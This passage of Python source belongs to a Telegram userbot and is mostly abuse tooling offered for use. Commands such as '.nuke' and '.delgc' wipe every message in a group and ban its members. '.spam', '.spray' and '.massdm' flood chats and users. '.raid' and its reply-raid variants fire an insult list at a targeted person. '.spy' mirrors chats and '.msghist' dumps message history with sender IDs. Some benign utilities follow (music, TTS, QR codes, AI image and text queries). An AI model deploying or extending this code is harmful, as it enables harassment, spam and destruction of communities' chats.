        try: await m.delete()
        except: pass
    else:
        confirm[cid]=True; await edit(e,"NUKE ARMED - type .nuke again to fire. ALL msgs deleted + ALL members banned.")

@cmd("delgc")
async def delgc_c_fn(e,_):
    cid=e.chat_id
    confirm=delgc_c_fn.__dict__.setdefault("_confirm",{})
    if not confirm.get(cid):
        confirm[cid]=True; return await edit(e,"delgc ARMED - type .delgc again to fire.")
    confirm[cid]=False; m=await edit(e,"Collecting all message IDs...")
    ids=set(); lock=asyncio.Lock()
    async def _collect(off=0,limit=3000):
        try:
            async for msg in client.iter_messages(cid,limit=limit,offset_id=off,wait_time=0):
                async with lock: ids.add(msg.id)
        except: pass
    try:
        recent=[]
        async for mg in client.iter_messages(cid,limit=1): recent.append(mg.id)
        top=recent[0] if recent else 0
        offs=list(range(0,max(top+1,1),max(top//100+1,1)))[:100]
        await asyncio.gather(*[_collect(o,3000) for o in offs])
    except: pass
    id_list=list(ids)
    if m and m.id in id_list: id_list.remove(m.id)
    if not id_list: return await edit(m,"❌ No messages.")
    await edit(m,f"Detonating {len(id_list):,} messages...")
    sem=asyncio.Semaphore(50)
    async def _del(b):
        async with sem:
            try: await client.delete_messages(cid,b,revoke=True)
            except: pass
    await asyncio.gather(*[_del(id_list[i:i+100]) for i in range(0,len(id_list),100)])
    try: await client.send_message("me",f"delgc: {len(id_list):,} msgs nuked from `{cid}`"); await m.delete()
    except: pass

@cmd("zscrape")
async def zscrape_c(e,_):
    await edit(e,"Scraping zombies...")
    zombies=[]; offset=0
    while True:
        try:
            r=await client(GetParticipantsRequest(e.chat_id,ChannelParticipantsSearch(""),offset,200,0))
            if not r.users: break
            for u in r.users:
                if u.deleted: zombies.append(u.id)
            if len(r.users)<200: break
            offset+=len(r.users)
        except: break
    DB["zombie_ids"]=zombies; db_save()
    await edit(e,f"Found {len(zombies)} deleted accounts.")

@cmd("zlist")
async def zlist_c(e,_):
    zombies=DB.get("zombie_ids",[])
    if not zombies: return await edit(e,"No zombie list. Run .zscrape or .kickzombies first.")
    header=f"Zombie Accounts: {len(zombies)} total\n\n"
    id_str=str(zombies)
    if len(id_str)<=3500: await edit(e,header+id_str)
    else:
        await edit(e,header+"Sending in chunks...")
        for i in range(0,len(zombies),50):
            chunk=zombies[i:i+50]
            await client.send_message(e.chat_id,f"Part {i//50+1}: {chunk}")
            await asyncio.sleep(0.3)

@cmd("kickzombies")
async def kickzombies_c(e,_):
    await edit(e,"Finding and kicking zombies...")
    zombies=[]; offset=0
    while True:
        try:
            r=await client(GetParticipantsRequest(e.chat_id,ChannelParticipantsSearch(""),offset,200,0))
            if not r.users: break
            for u in r.users:
                if u.deleted: zombies.append(u.id)
            if len(r.users)<200: break
            offset+=len(r.users)
        except: break
    if not zombies: return await edit(e,"No zombie accounts found!")
    results=await asyncio.gather(
        *[client(EditBannedRequest(e.chat_id,uid,ChatBannedRights(until_date=None,view_messages=True))) for uid in zombies],
        return_exceptions=True)
    done=sum(1 for r in results if not isinstance(r,Exception))
    DB["zombie_ids"]=zombies; db_save()
    summary=f"Kicked {done}/{len(zombies)} zombie accounts!"
    if len(str(zombies))<=3000: await edit(e,summary+f"\nIDs: `{zombies}`")
    else:
        await edit(e,summary)
        for i in range(0,len(zombies),50):
            await client.send_message(e.chat_id,f"Zombies {i//50+1}: {zombies[i:i+50]}")
            await asyncio.sleep(0.3)

@cmd("msghist")
async def msghist_c(e,arg):
    n=min(int(arg) if arg and arg.isdigit() else 500,5000)
    await edit(e,f"Dumping {n} msgs...")
    msgs=[]
    async for msg in client.iter_messages(e.chat_id,limit=n):
        msgs.append({"id":msg.id,"sender":msg.sender_id,"text":msg.text or "[media]","date":str(msg.date)})
    import json as _j
    fname=f"data/history_{e.chat_id}.json"
    with open(fname,"w",encoding="utf-8") as f: _j.dump(msgs,f,indent=2,ensure_ascii=False)
    await edit(e,f"Dumped {len(msgs)} msgs to `{fname}`")

@cmd("sniper")
async def sniper_c(e,arg):
    global sniper_task
    if not arg: return await edit(e,"❌ .sniper <username>")
    uname=arg.strip().lstrip("@"); await edit(e,f"Sniping `@{uname}`...")
    async def _loop():
        while True:
            try:
                try: await client.get_entity(uname)
                except:
                    if UpdateUsernameRequest:
                        try:
                            await client(UpdateUsernameRequest(uname))
                            await client.send_message("me",f"SNIPED! @{uname} is yours!")
                            return
                        except Exception as ex: await client.send_message("me",f"Snipe failed: `{ex}`")
                await asyncio.sleep(30)
            except asyncio.CancelledError: break
    if sniper_task: sniper_task.cancel()
    sniper_task=asyncio.create_task(_loop())

@cmd("join")
async def join_c(e,arg):
    if not arg: return await edit(e,"❌ .join <link or @username>")
    link=arg.strip()
    try:
        if "t.me/+" in link or "t.me/joinchat/" in link:
            hash_part=link.split("/")[-1].replace("+","")
            await client(ImportChatInviteRequest(hash_part))
        else: await client(JoinChannelRequest(link.lstrip("@")))
        await edit(e,f"Joined {arg}!")
    except Exception as ex: await edit(e,f"❌ `{ex}`")

@cmd("leaveall")
async def leaveall_c(e,_):
    """Leave all groups and channels instantly using parallel workers."""
    m = await edit(e, "🚪 Collecting all groups/channels...")
    left = 0; failed = 0; targets = []
    async for dialog in client.iter_dialogs():
        if dialog.is_group or dialog.is_channel:
            targets.append(dialog.entity)
    if not targets:
        return await edit(m, "❌ No groups/channels found.")
    await edit(m, f"🚪 Leaving {len(targets)} chats (parallel)...")
    async def _leave(ent):
        try:
            await client(LeaveChannelRequest(ent))
            return True
        except: return False
    results = await asyncio.gather(*[_leave(ent) for ent in targets], return_exceptions=True)
    left = sum(1 for r in results if r is True)
    failed = len(targets) - left
    try:
        await client.send_message("me", f"🚪 leaveall done\nLeft: {left} | Failed: {failed}")
    except: pass
    try: await m.delete()
    except: pass

@cmd("leave")
async def leave_c(e, arg):
    """Leave a specific chat by chat_id or by replying in it."""
    if arg and arg.strip().lstrip("-").isdigit():
        cid = int(arg.strip())
    else:
        cid = e.chat_id
    try:
        ent = await client.get_entity(cid)
        await client(LeaveChannelRequest(ent))
        await client.send_message("me", f"🚪 Left chat `{cid}`")
    except Exception as ex:
        await edit(e, f"❌ `{ex}`")
        return
    try: await e.delete()
    except: pass

@cmd("clean")
async def clean_c(e, _):
    """Delete ALL your messages in ALL groups/channels simultaneously (ultra-fast)."""
    me = await client.get_me()
    m = await edit(e, "🗑️ Scanning all chats for your messages...")
    dialogs = await client.get_dialogs(limit=None)
    # skip Saved Messages
    targets = [d for d in dialogs if not (hasattr(d.entity, "is_self") and d.entity.is_self)]
    await edit(m, f"🗑️ Found {len(targets)} chats — nuking your messages...")
    total_deleted = 0
    failed_chats = []

    async def _delete_in_chat(dialog):
        nonlocal total_deleted
        entity = dialog.entity
        try:
            msg_ids = []
            async for msg in client.iter_messages(entity, from_user=me, limit=None):
                from telethon.tl.types import MessageService
                if not isinstance(msg, MessageService):
                    msg_ids.append(msg.id)
            if not msg_ids:
                return
            for i in range(0, len(msg_ids), 100):
                chunk = msg_ids[i:i+100]
                try:
                    await client.delete_messages(entity, chunk, revoke=True)
                    total_deleted += len(chunk)
                except FloodWaitError as fw:
                    await asyncio.sleep(fw.seconds)
                    try:
                        await client.delete_messages(entity, chunk, revoke=True)
                        total_deleted += len(chunk)
                    except: pass
                except Exception:
                    pass
        except Exception as ex:
            name = getattr(entity, "title", None) or str(getattr(entity, "id", "?"))
            failed_chats.append(f"{name}: {ex}")

    WORKERS = 8
    queue = asyncio.Queue()
    for d in targets:
        await queue.put(d)

    async def _worker():
        while True:
            try:
                dialog = queue.get_nowait()
            except asyncio.QueueEmpty:
                break
            try:
                await _delete_in_chat(dialog)
            finally:
                queue.task_done()

    worker_tasks = [asyncio.create_task(_worker()) for _ in range(WORKERS)]
    await queue.join()
    for wt in worker_tasks:
        wt.cancel()

    summary = (
        f"🗑️ **clean complete**\n"
        f"✅ Deleted: `{total_deleted}` messages\n"
        f"📂 Chats scanned: `{len(targets)}`\n"
    )
    if failed_chats:
        summary += f"⚠️ Issues: `{len(failed_chats)}`"
    try:
        await client.send_message("me", summary)
    except: pass
    try: await m.delete()
    except: pass

@cmd("setbots")
async def setbots_c(e,arg):
    if not arg: return await edit(e,"❌ .setbots @bot1 @bot2 ...")
    bots_parsed=[b.strip() for b in re.split(r"[\s,;]+",arg) if b.strip().startswith("@")]
    bot_usernames[:]=bots_parsed[:MAX_BOTS]; save_bots()
    await edit(e,f"Saved {len(bot_usernames)} bots")

@cmd("bots")
async def bots_c(e,_):
    if not bot_usernames: return await edit(e,"No saved bots. Use .setbots")
    await edit(e,"Saved Bots:\n"+"\n".join(f"{i}. `{b}`" for i,b in enumerate(bot_usernames,1)))

@cmd("addbot")
async def addbot_c(e,arg):
    bots=[b.strip() for b in re.split(r"[\s,;]+",arg) if b.strip()] or bot_usernames
    added=[]
    for b in bots:
        try:
            user=await client.get_input_entity(b)
            await client(InviteToChannelRequest(e.chat_id,[user])); added.append(b)
        except: pass
    await edit(e,f"Added: `{', '.join(added) or 'None'}`")

@cmd("promotebots")
async def promotebots_c(e,arg):
    bots=[b.strip() for b in re.split(r"[\s,;]+",arg) if b.strip()] or bot_usernames
    promoted=[]
    for b in bots:
        try:
            user=await client.get_input_entity(b)
            await client(EditAdminRequest(e.chat_id,user,FULL_ADMIN,rank="Bot")); promoted.append(b)
        except: pass
    await edit(e,f"Promoted: `{', '.join(promoted) or 'None'}`")

@cmd("removebots")
async def removebots_c(e,_):
    removed=0
    for b in bot_usernames:
        try:
            user=await client.get_entity(b)
            await client(EditBannedRequest(e.chat_id,user.id,ChatBannedRights(until_date=None,view_messages=True))); removed+=1
        except: pass
    await edit(e,f"Removed {removed} bot(s).")

@cmd("creategc")
async def creategc_c(e,arg):
    if not arg: return await edit(e,"❌ .creategc <name>")
    try:
        res=await client(CreateChannelRequest(title=arg[:128],about="Hubst",megagroup=True))
        await edit(e,f"Created group: `{arg}` ID: `-100{res.chats[0].id}`")
    except Exception as ex: await edit(e,f"❌ `{ex}`")

@cmd("createch")
async def createch_c(e,arg):
    if not arg: return await edit(e,"❌ .createch <name>")
    try:
        res=await client(CreateChannelRequest(title=arg[:128],about="Hubst",megagroup=False))
        await edit(e,f"Created channel: `{arg}` ID: `-100{res.chats[0].id}`")
    except Exception as ex: await edit(e,f"❌ `{ex}`")

@cmd("creategcqty")
async def creategcqty_c(e,arg):
    pts=arg.split(maxsplit=1) if arg else []
    if len(pts)<2 or not pts[0].isdigit(): return await edit(e,"❌ .creategcqty <qty> <name>")
    qty=min(int(pts[0]),20); name=pts[1]
    await edit(e,f"Creating {qty} groups..."); created=[]; failed=0
    for i in range(qty):
        gname=f"{name} {i+1}" if qty>1 else name
        try:
            res=await client(CreateChannelRequest(title=gname[:128],about="Hubst",megagroup=True))
            created.append(f"`{gname}` -> `-100{res.chats[0].id}`"); await asyncio.sleep(2)
        except: failed+=1
    lines=[f"Created {len(created)} groups:"]+created
    if failed: lines.append(f"Failed: {failed}")
    await client.send_message("me","\n".join(lines)); await edit(e,f"Done! Created {len(created)} groups.")

@cmd("fetchallgc")
async def fetchallgc_c(e,_):
    await edit(e,"Fetching your GCs..."); groups=[]
    async for dialog in client.iter_dialogs():
        if dialog.is_group or (dialog.is_channel and getattr(dialog.entity,"megagroup",False)):
            groups.append(f"- `{dialog.name[:40]}` -> `-100{dialog.entity.id}`")
    if not groups: return await edit(e,"No groups found.")
    text=f"Your Groups ({len(groups)}):\n"+"\n".join(groups[:50])
    if len(groups)>50: text+=f"\n...and {len(groups)-50} more"
    await edit(e,text)

@cmd("targetgc")
async def targetgc_c(e,arg):
    if not arg: return await edit(e,"❌ .targetgc <chat_id>")
    try:
        cid=int(arg.strip())
        if cid not in target_gcs: target_gcs.append(cid); DB["target_gcs"]=target_gcs; db_save()
        await edit(e,f"Added `{cid}`. Total: {len(target_gcs)}")
    except ValueError: await edit(e,"❌ Invalid chat ID")

@cmd("cleartargets")
async def cleartargets_c(e,_):
    target_gcs.clear(); DB["target_gcs"]=[]; db_save(); await edit(e,"Target list cleared.")

@cmd("targetlist")
async def targetlist_c(e,_):
    if not target_gcs: return await edit(e,"No targets. Use .targetgc <id>")
    lines=[f"Targets ({len(target_gcs)}):"]
    for cid in target_gcs:
        try: chat=await client.get_entity(cid); lines.append(f"- `{display(chat)}` (`{cid}`)")
        except: lines.append(f"- `{cid}`")
    await edit(e,"\n".join(lines))

@cmd("sendmessage")
async def sendmessage_c(e,arg):
    global _blast_stop
    if not arg: return await edit(e,"❌ .sendmessage <message>")
    if not target_gcs: return await edit(e,"❌ No targets. Use .targetgc first.")
    await edit(e,f"Blasting to {len(target_gcs)} targets..."); _blast_stop=False; sent=0; failed=0
    for cid in list(target_gcs):
        if _blast_stop: break
        try: await client.send_message(cid,arg); sent+=1; await asyncio.sleep(2)
        except FloodWaitError as fw: await asyncio.sleep(fw.seconds)
        except: failed+=1
    _blast_stop=False; await client.send_message("me",f"Blast done: Sent:{sent} Failed:{failed}")

@cmd("blastall")
async def blastall_c(e,arg):
    global _blast_stop
    if not arg: return await edit(e,"❌ .blastall <message>")
    await edit(e,"Blasting to ALL your groups..."); _blast_stop=False; sent=0; failed=0
    async for dialog in client.iter_dialogs():
        if _blast_stop: break
        if not (dialog.is_group or (dialog.is_channel and getattr(dialog.entity,"megagroup",False))): continue
        try: await client.send_message(dialog.entity,arg); sent+=1; await asyncio.sleep(3)
        except FloodWaitError as fw: await asyncio.sleep(fw.seconds)
        except: failed+=1
    _blast_stop=False; await client.send_message("me",f"Blast all done: Sent:{sent} Failed:{failed}")

@cmd("stopblast")
async def stopblast_c(e,_):
    global _blast_stop; _blast_stop=True; await edit(e,"Blast stopped.")

# ── Spam & Flood ──────────────────────────────────────────────────
async def _spam_loop(cid,msg,count,delay,reply_to=None):
    for _ in range(count):
        try: await client.send_message(cid,msg,reply_to=reply_to); await asyncio.sleep(delay)
        except asyncio.CancelledError: break
        except FloodWaitError as fw: await asyncio.sleep(fw.seconds)
        except: break

@cmd("spam")
async def spam_c(e,arg):
    pts=arg.split(maxsplit=1)
    if len(pts)<2 or not pts[0].isdigit(): return await edit(e,"❌ .spam <n> <msg>")
    cid=e.chat_id
    if cid in spam_tasks: spam_tasks[cid].cancel()
    spam_tasks[cid]=asyncio.create_task(_spam_loop(cid,pts[1],min(int(pts[0]),500),0.1))
    await edit(e,f"Spam x{pts[0]}")

@cmd("fspam")
async def fspam_c(e,arg):
    pts=arg.split(maxsplit=1)
    if len(pts)<2 or not pts[0].isdigit(): return await edit(e,"❌ .fspam <n> <msg>")
    cid=e.chat_id
    if cid in spam_tasks: spam_tasks[cid].cancel()
    spam_tasks[cid]=asyncio.create_task(_spam_loop(cid,pts[1],min(int(pts[0]),500),0.02))
    await edit(e,f"Turbo spam x{pts[0]}")

@cmd("slowspam")
async def slowspam_c(e,arg):
    pts=arg.split(maxsplit=1)
    if len(pts)<2 or not pts[0].isdigit(): return await edit(e,"❌ .slowspam <n> <msg>")
    cid=e.chat_id
    if cid in spam_tasks: spam_tasks[cid].cancel()
    spam_tasks[cid]=asyncio.create_task(_spam_loop(cid,pts[1],min(int(pts[0]),200),0.5))
    await edit(e,f"Slow spam x{pts[0]}")

@cmd("rspam")
async def rspam_c(e,arg):
    if not e.reply_to_msg_id: return await edit(e,"❌ Reply to a message first")
    pts=arg.split(maxsplit=1)
    if len(pts)<2 or not pts[0].isdigit(): return await edit(e,"❌ .rspam <n> <msg>")
    cid=e.chat_id
    if cid in spam_tasks: spam_tasks[cid].cancel()
    spam_tasks[cid]=asyncio.create_task(_spam_loop(cid,pts[1],min(int(pts[0]),500),0.1,e.reply_to_msg_id))
    await edit(e,f"Reply spam x{pts[0]}")

@cmd("stopspam")
async def stopspam_c(e,_):
    cid=e.chat_id
    if cid in spam_tasks: spam_tasks[cid].cancel(); del spam_tasks[cid]; await edit(e,"Spam stopped!")
    else: await edit(e,"No active spam.")

@cmd("spray")
async def spray_c(e,arg):
    if not arg: return await edit(e,"❌ .spray <text>")
    cid=e.chat_id
    if cid in spray_tasks and not spray_tasks[cid].done(): return await edit(e,"Spray already active!")
    await edit(e,"Spray started!")
    async def _loop():
        try:
            while True: await client.send_message(cid,arg[:4000]); await asyncio.sleep(SPRAY_DELAY)
        except asyncio.CancelledError: pass
    spray_tasks[cid]=asyncio.ensure_future(_loop())

@cmd("dspray")
async def dspray_c(e,_):
    cid=e.chat_id; t=spray_tasks.get(cid)
    if t and not t.done(): t.cancel(); del spray_tasks[cid]; await edit(e,"Spray stopped!")
    else: await edit(e,"No active spray.")

@cmd("massdm")
async def massdm_c(e,arg):
    global _massdm_stop
    if not arg: return await edit(e,"❌ .massdm <msg>")
    await edit(e,"Mass DM started..."); _massdm_stop=False; sent=0
    members=await get_all_members(e.chat_id)
    for u in members:
        if _massdm_stop: break
        try: await client.send_message(u.id,arg); sent+=1; await asyncio.sleep(2)
        except FloodWaitError as fw: await asyncio.sleep(fw.seconds)
        except: pass
    _massdm_stop=False; await client.send_message("me",f"Mass DM done. Sent to {sent} users.")

@cmd("dmc")
async def dmc_c(e,_):
    global _massdm_stop; _massdm_stop=True; await edit(e,"Mass DM stopped.")

@cmd("spy")
async def spy_c(e,_): spy_chats[e.chat_id]="me"; await edit(e,"Spy ON - mirroring to Saved Messages.")
@cmd("spystop")
async def spystop_c(e,_): spy_chats.pop(e.chat_id,None); await edit(e,"Spy OFF.")

# ── Stop ─────────────────────────────────────────────────────────
@cmd("stop")
async def stop_c(e,_):
    cid=e.chat_id; stopped=False
    if raid_flags.get(cid): raid_flags[cid]=False; stopped=True
    if cid in spam_tasks: spam_tasks[cid].cancel(); del spam_tasks[cid]; stopped=True
    active_raids.get(str(cid),{}).clear(); stopped=True
    await edit(e,"Stopped!" if stopped else "Nothing active.")

@cmd("stopall")
async def stopall_c(e,_):
    for s in [reply_u,rr_u,flag_u,hrr_u,abuse_u,abuse2_u,slap_u,kick_u,mraid_u,replygod_u,bomb_u,clone_reply_u]:
        s.clear()
    replyvx_s.clear(); slide_s.clear(); active_raids.clear()
    for t in [*spray_tasks.values(),*spam_tasks.values()]:
        if not t.done(): t.cancel()
    spray_tasks.clear(); spam_tasks.clear()
    global fastgc_active,clone_task,fastgc_task
    fastgc_active=False
    if fastgc_task and not fastgc_task.done(): fastgc_task.cancel()
    if clone_task and not clone_task.done(): clone_task.cancel()
    await edit(e,"ALL RAIDS/TASKS STOPPED!")

# ── Raid commands ─────────────────────────────────────────────────
@cmd("raid")
async def raid_c(e,arg):
    raw=arg.split(); count=None; args2=raw
    if raw and raw[-1].isdigit(): count=int(raw[-1]); args2=raw[:-1]
    uid,ent=await resolve_target(e,args2)
    msgs=GAALI_LIST.copy(); random.shuffle(msgs)
    if count: msgs=(msgs*(count//len(msgs)+1))[:count]
    tag=(mention(ent)+" ") if ent else ""
    cid=e.chat_id; raid_flags[cid]=True; await e.delete()
    for msg in msgs:
        if not raid_flags.get(cid): break
        try: await client.send_message(cid,f"{tag}{msg}")
        except FloodWaitError as fw: await asyncio.sleep(fw.seconds)
        except: pass
        await asyncio.sleep(0.3)
    raid_flags[cid]=False

def _on_r(store,lbl):
    async def _h(e,arg):
        t=await get_targets(e,arg)
        if not t: return await edit(e,"❌ Reply or give @user")
        store.update(t); await edit(e,f"{lbl} ON -> {', '.join(str(u) for u in t)}")
    return _h

def _off_r(store,lbl):
    async def _h(e,arg):
        t=await get_targets(e,arg)
        if t:
            for u in t: store.discard(u)
        else: store.clear()
        await edit(e,f"{lbl} OFF")
    return _h

for _nm,_st,_lb in [
    ("rraid",reply_u,"Gaali raid"),("drraid",reply_u,"Gaali raid"),
    ("reply",reply_u,"Reply"),("sreply",reply_u,"Reply"),
    ("rr",rr_u,"RR"),("srr",rr_u,"RR"),
    ("flag",flag_u,"Flag"),("sflag",flag_u,"Flag"),
    ("hrr",hrr_u,"HRR"),("shrr",hrr_u,"HRR"),
    ("replygod",replygod_u,"God"),("sgod",replygod_u,"God"),
    ("bomb",bomb_u,"Bomb"),("sbomb",bomb_u,"Bomb"),
    ("abuse",abuse_u,"Abuse"),("sabuse",abuse_u,"Abuse"),
    ("abuse2",abuse2_u,"Abuse2"),("sabuse2",abuse2_u,"Abuse2"),
    ("slap",slap_u,"Slap"),("sslap",slap_u,"Slap"),
    ("mraid",mraid_u,"MRaid"),("smraid",mraid_u,"MRaid"),
    ("clonereply",clone_reply_u,"CloneReply"),("sclone",clone_reply_u,"CloneReply"),
    ("kickraid",kick_u,"KickRaid"),("skickraid",kick_u,"KickRaid"),
]:
    _fn=_off_r(_st,_lb) if _nm.startswith("s") or _nm.startswith("d") else _on_r(_st,_lb)
    cmd(_nm)(_fn)

@cmd("setmraid")
async def setmraid_c(e,_):
    global mraid_ref
    if not e.is_reply: return await edit(e,"❌ Reply to photo/video/gif")
    r=await e.get_reply_message()
    if not r.media: return await edit(e,"❌ Reply must have media")
    saved=await r.forward_to("me"); mraid_ref=(saved.chat_id,saved.id)
    DB["mraid_ref"]=f"{saved.chat_id}:{saved.id}"; db_save()
    await edit(e,f"MRaid media set! ID:`{saved.id}`")

@cmd("replyvx")
async def replyvx_c(e,arg):
    pts=arg.rsplit(" ",1) if arg else []
    if len(pts)<2 or not pts[1].isdigit(): return await edit(e,"❌ .replyvx <text> <n>")
    t=await get_targets(e,"")
    if not t: return await edit(e,"❌ Reply to target")
    for uid in t: replyvx_s[uid]={"text":pts[0],"count":min(int(pts[1]),100)}
    await edit(e,f"ReplyVX ON x{pts[1]}")

@cmd("svx")
async def svx_c(e,arg):
    t=await get_targets(e,arg)
    if t:
        for u in t: replyvx_s.pop(u,None)
    else: replyvx_s.clear()
    await edit(e,"ReplyVX OFF")

@cmd("slideraid")
async def slideraid_c(e,arg):
    if not arg: return await edit(e,"❌ .slideraid <text>")
    t=await get_targets(e,"")
    if not t: return await edit(e,"❌ Reply to target")
    for uid in t: slide_s[uid]={"text":arg[:3000],"idx":0}
    await edit(e,"Slide Raid ON")

@cmd("dslide")
async def dslide_c(e,arg):
    t=await get_targets(e,arg)
    if t:
        for u in t: slide_s.pop(u,None)
    else: slide_s.clear()
    await edit(e,"Slide OFF")

@cmd("sflood")
async def sflood_c(e,arg):
    if not e.is_reply: return await edit(e,"❌ Reply to sticker")
    r=await e.get_reply_message()
    if not r.sticker: return await edit(e,"❌ Reply to sticker")
    n=min(int(arg) if arg and arg.isdigit() else 20,200); cid=e.chat_id
    raid_flags[cid]=True; await e.delete()
    for _ in range(n):
        if not raid_flags.get(cid): break
        try: await client.send_file(cid,r.sticker)
        except FloodWaitError as fw: await asyncio.sleep(fw.seconds)
        except: break
        await asyncio.sleep(0.1)
    raid_flags[cid]=False

@cmd("gflood")
async def gflood_c(e,arg):
    if not e.is_reply: return await edit(e,"❌ Reply to GIF")
    r=await e.get_reply_message()
    media=r.gif or (r.document if r.document and r.document.mime_type=="video/mp4" else None)
    if not media: return await edit(e,"❌ Reply to GIF")
    n=min(int(arg) if arg and arg.isdigit() else 20,200); cid=e.chat_id
    raid_flags[cid]=True; await e.delete()
    for _ in range(n):
        if not raid_flags.get(cid): break
        try: await client.send_file(cid,media)
        except FloodWaitError as fw: await asyncio.sleep(fw.seconds)
        except: break
        await asyncio.sleep(0.1)
    raid_flags[cid]=False

# ── Tools ─────────────────────────────────────────────────────────
@cmd("music")
async def music_c(e,arg):
    if not arg: return await edit(e,"❌ .music <song or URL>")
    m=await edit(e,f"Searching `{arg}`...")
    if yt_dlp:
        query=arg if arg.startswith(("http://","https://")) else f"ytsearch1:{arg}"
        opts={"format":"bestaudio/best","outtmpl":f"downloads/music_{e.id}.%(ext)s",
              "quiet":True,"noplaylist":True,"ffmpeg_location":_FFMPEG_PATH,
              "postprocessors":[{"key":"FFmpegExtractAudio","preferredcodec":"mp3","preferredquality":"192"}]}
        try:
            def _dl():
                with yt_dlp.YoutubeDL(opts) as ydl:
                    info=ydl.extract_info(query,download=True)
                    if info and "entries" in info: info=next((x for x in info["entries"] if x),None)
                    return info
            info=await asyncio.to_thread(_dl)
            if info:
                matches=_glob.glob(f"downloads/music_{e.id}.*")
                if matches:
                    path=matches[0]; title=info.get("title","Unknown"); dur=int(info.get("duration") or 0)
                    mins,secs_r=divmod(dur,60)
                    await edit(m,f"Uploading `{title}`...")
                    await client.send_file(e.chat_id,path,
                        caption=f"🎵 {title} | {mins}:{secs_r:02d}",
                        attributes=[DocumentAttributeAudio(duration=dur,title=title,performer="YouTube")])
                    try: os.remove(path)
                    except: pass
                    try: await m.delete()
                    except: pass
                    return
        except Exception as ex: log.warning(f"music yt: {ex}")
    try:
        await edit(m,f"Trying JioSaavn for `{arg}`...")
        resp=await asyncio.to_thread(lambda: requests.get(
            f"https://saavnapi-nine.vercel.app/result/?query={urllib.parse.quote(arg,safe='')}",timeout=15).json())
        songs=resp.get("results",[]) if isinstance(resp,dict) else (resp if isinstance(resp,list) else [])
        valid=[s for s in songs if isinstance(s,dict) and s.get("media_url")]
        if valid:
            song=valid[0]; name=song.get("song") or arg; url=song.get("media_url")
            await edit(m,f"Downloading `{name}`...")
            data=await asyncio.to_thread(lambda: requests.get(url,timeout=40).content)
            path=f"temp/music_{e.id}.mp3"
            with open(path,"wb") as fh: fh.write(data)
            await client.send_file(e.chat_id,path,caption=f"🎵 {name} (JioSaavn)",
                attributes=[DocumentAttributeAudio(duration=0,title=name,performer="JioSaavn")])
            try: os.remove(path)
            except: pass
            try: await m.delete()
            except: pass
            return
    except Exception as ex: log.warning(f"music saavn: {ex}")
    await edit(m,"❌ Music download failed.\nFix: pip install yt-dlp && pkg install ffmpeg")

@cmd("song")
async def song_c(e,arg):
    if not arg: return await edit(e,"❌ .song <song name>")
    m=await edit(e,f"Searching `{arg}` on JioSaavn...")
    try:
        resp=await asyncio.to_thread(lambda: requests.get(
            f"https://saavnapi-nine.vercel.app/result/?query={urllib.parse.quote(arg,safe='')}",timeout=15).json())
        songs=resp.get("results",[]) if isinstance(resp,dict) else (resp if isinstance(resp,list) else [])
        valid=[s for s in songs if isinstance(s,dict) and s.get("media_url")]
        if not valid: return await edit(m,f"❌ No results for `{arg}`")
        song=valid[0]; name=song.get("song") or arg; url=song.get("media_url")
        await edit(m,f"Downloading `{name}`...")
        data=await asyncio.to_thread(lambda: requests.get(url,timeout=40).content)
        path=f"temp/song_{e.id}.mp3"
        with open(path,"wb") as fh: fh.write(data)
        await client.send_file(e.chat_id,path,caption=f"🎵 {name}",
            attributes=[DocumentAttributeAudio(duration=0,title=name,performer="JioSaavn")])
        try: os.remove(path)
        except: pass
        try: await m.delete()
        except: pass
    except Exception as ex: await edit(m,f"❌ `{ex}`")

@cmd("tts")
async def tts_c(e,arg):
    if not arg: return await edit(e,"❌ .tts [lang] <text>")
    if not gTTS: return await edit(e,"❌ pip install gtts")
    pts=arg.split(" ",1); lang,text=(pts[0],pts[1]) if len(pts)>1 and len(pts[0])==2 else ("en",arg)
    await edit(e,"Generating voice...")
    try:
        tts=gTTS(text=text[:500],lang=lang); path=f"temp/tts_{e.id}.mp3"; tts.save(path)
        await client.send_file(e.chat_id,path,voice_note=True,caption=f"TTS: {text[:50]}")
        os.remove(path); await e.delete()
    except Exception as ex: await edit(e,f"❌ `{ex}`")

@cmd("qrcode")
async def qrcode_c(e,arg):
    if not arg: return await edit(e,"❌ .qrcode <text>")
    await edit(e,"Generating QR...")
    if _qr_lib:
        try:
            qr=_qr_lib.QRCode(version=1,box_size=10,border=4); qr.add_data(arg); qr.make(fit=True)
            img=qr.make_image(fill_color="black",back_color="white")
            path=f"temp/qr_{e.id}.png"; img.save(path)
            await client.send_file(e.chat_id,path,caption=f"QR: {arg[:60]}")
            os.remove(path); await e.delete(); return
        except Exception as ex: log.warning(f"qr lib: {ex}")
    try:
        url=f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={urllib.parse.quote(arg)}"
        img_data=await asyncio.to_thread(lambda: requests.get(url,timeout=15).content)
        path=f"temp/qr_{e.id}.png"
        with open(path,"wb") as fh: fh.write(img_data)
        await client.send_file(e.chat_id,path,caption=f"QR: {arg[:60]}")
        os.remove(path); await e.delete()
    except Exception as ex: await edit(e,f"❌ `{ex}`")

@cmd("ask")
async def ask_c(e,arg):
    if not arg: return await edit(e,"❌ .ask <question>")
    if not GEMINI_KEY: return await edit(e,"❌ Set GEMINI_KEY env var first.")
    await edit(e,"Thinking...")
    ep=f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent"
    payload={"contents":[{"role":"user","parts":[{"text":arg}]}],"generationConfig":{"maxOutputTokens":1024}}
    try:
        resp=await asyncio.to_thread(requests.post,ep,
            headers={"x-goog-api-key":GEMINI_KEY,"Content-Type":"application/json"},
            json=payload,timeout=45)
        data=resp.json()
        candidates=data.get("candidates",[])
        parts=candidates[0].get("content",{}).get("parts",[]) if candidates else []
        answer="\n".join(str(p.get("text","")).strip() for p in parts if p.get("text")).strip()
        if not answer: return await edit(e,"❌ No response.")
        await edit(e,f"Gemini AI:\n{answer[:3600]}")
    except Exception as ex: await edit(e,f"❌ `{ex}`")

@cmd("imagine")
async def imagine_c(e,arg):
    if not arg: return await edit(e,"❌ .imagine <prompt>")
    await edit(e,"Generating image...")
    try:
        seed=random.randint(1,999999)
        url=f"https://image.pollinations.ai/prompt/{urllib.parse.quote(arg,safe='')}?width=1024&height=1024&nologo=true&seed={seed}&model=flux"
        img=await asyncio.to_thread(lambda: requests.get(url,timeout=60,headers={"User-Agent":"HUBST/4.0"}).content)
        buf=BytesIO(img); buf.name="ai.jpg"
        await client.send_file(e.chat_id,buf,caption=f"AI: {arg[:100]}")
        await e.delete()
    except Exception as ex: await edit(e,f"❌ `{ex}`")

@cmd("translate")
async def translate_c(e,arg):
    if not arg or " " not in arg: return await edit(e,"❌ .translate <lang> <text>")
    lang,text=arg.split(" ",1)
